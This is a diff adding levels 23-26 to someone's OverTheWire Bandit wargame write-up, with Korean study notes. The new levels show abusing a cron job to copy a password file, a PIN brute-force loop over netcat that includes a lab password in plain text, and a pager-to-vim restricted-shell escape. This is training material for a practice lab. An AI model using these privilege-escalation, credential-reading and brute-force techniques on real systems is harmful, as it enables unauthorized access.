@@ -661,3 +661,134 @@ Notes:
  - ⚠️ 너무 다급해서 내가 뭘한지 모르겠다 ㅠ.ㅠ 복습해야겠다.
  - 🤖 chmod 777 은 모든 사용자에게 읽기·쓰기·실행 권한을 전부 열어주는 위험한 설정으로, 보안 환경에서는 불필요한 권한 확장을 초래할 수 있기 때문에 실제 운영 환경에서는 권장되지 않는다. 이 문제에서는 실행만 필요하므로 chmod +x 정도면 충분하다.
 _Date 2025-12-26_
+
+
+## Bandit Level 23 -> 24 
+Goal:A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Command:
+```bash
+$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+$ cd /tmp
+$ mkdir hope
+$ cd hope
+$ nano script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/hope/bandit24
+$ chmod o+w script.sh
+$ ls -al
+total 10020
+drwxrwxr-x   2 bandit23 bandit23     4096 Dec 29 03:08 .
+drwxrwx-wt 528 root     root     10244096 Dec 29 03:08 ..
+-rw-rw-rw-   1 bandit23 bandit23       63 Dec 29 03:08 script.sh
+$ chmod o+w /tmp/hope
+$ ls -ld
+drwxrwxrwx 2 bandit23 bandit23 4096 Dec 29 03:08 .
+$ cp script.sh /var/spool/bandit24/foo
+# Nothing happened!
+# OH I forgot the execution permission!
+$ chmod o+x script.sh
+$ cp script.sh /var/spool/bandit24/foo
+# Wait a moment
+$ ls
+bandit24 script.sh
+$ cat bandit24
+password #XD!
+```
+
+Notes:
+ - ⚠️ 파일 생성 혹은 활용시 권한 항상 확인하기!
+ - 🤖 cron 실행 사용자 권한, 파일 소유자 조건, 실행 권한 여부, 출력 경로 접근 권한까지 단계별로 다시 점검할 것
+
+## Bandit Level 24 -> 25
+Goal: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+
+Command:
+```bash
+$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+$ previous password 0000
+Wrong! Please enter the correct current password and pincode. Try again.
+#I already knew the previous password, but I have to figure out the pincode!
+$ cd /tmp/hope
+$ nano hope.sh
+#!/bin/bash
+password='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
+
+for i in $(seq -w 0000 9999); do
+ echo "$password $i"
+done | nc localhost 30002
+#Saved!
+$ chmod +x hope.sh
+$ ./hope.sh
+There were too many wrong attempts...!
+Correct!
+The password of user bandit25 is ************* #XD
+```
+
+Notes :
+ -⚠️ Wrong! 이거 없이 성공한 값만 뜨게 파일을 만들어보고 싶은데!
+ -🤖 Wrong 메시지를 아예 없애긴 어렵고, 전체 출력은 파일로 저장한 뒤 Correct가 들어간 줄만 grep으로 골라 보는 식으로 처리해야 함.
+ -⚠️ ./hope.sh | grep 이런식으로 하면 되나? 근데 의미 없긴 하겠다! 패스!
+
+## Bandit Level 25 -> 26
+Goal:Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+Command:
+```bash
+$ ls
+bandit26.sshkey
+$ cat bandit26.sshkey
+-----BEGIN RSA PRIVATE KEY-----
+************************
+-----END RSA PRIVATE KEY----- 
+#I went to the local machine and copied the private key for bandit26.
+$ chmod 600 bandit26
+$ ssh -i bandit26 bandit26@bandit.labs.overthewire.org -p 2220
+Connection to bandit.labs.overthewire.org closed.
+#Hmm...? back to the bandit25
+$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+#I checked /etc/passwd and found that bandit26 doesn’t use /bin/bash but runs /usr/bin/showtext instead.
+#Since showtext uses a pager like more/less, I forced it to open the pager and then escaped to a shell from there.
+# Go to the local
+$ stty size 
+49 113
+$ stty rows 5 cols 20
+$ ssh -i bandit26 bandit26@bandit.labs.overthewire.org -p 2220
+#bandit26's information and 
+--More--(24$) # I got it!
+# I pushed the 'v' botton'
+$ :set shell=/bin/bash
+$ :shell
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+password #XD!
+```
+
+Notes:
+ - ⚠️ 기본 셸이 showtext로 고정되어 있으므로 터미널 크기를 줄여 pager를 강제로 띄운 뒤, pager → vim → shell 순으로 탈출해야하는 문제였다. 하면서 stty나 vim에 대한 기본적인 명령어를 써보았다. 다음에 심화적으로 공부해야겠다.
+ - 🤖 제한 셸 구조와 pager·vim 우회 흐름은 잘 해결했으니, 다음엔 stty 옵션과 vim의 외부 명령 실행 메커니즘을 명확히 이해해 “왜 동작하는지”까지 개념적으로 확인할 것.
+
+_Date 2025-12-29_
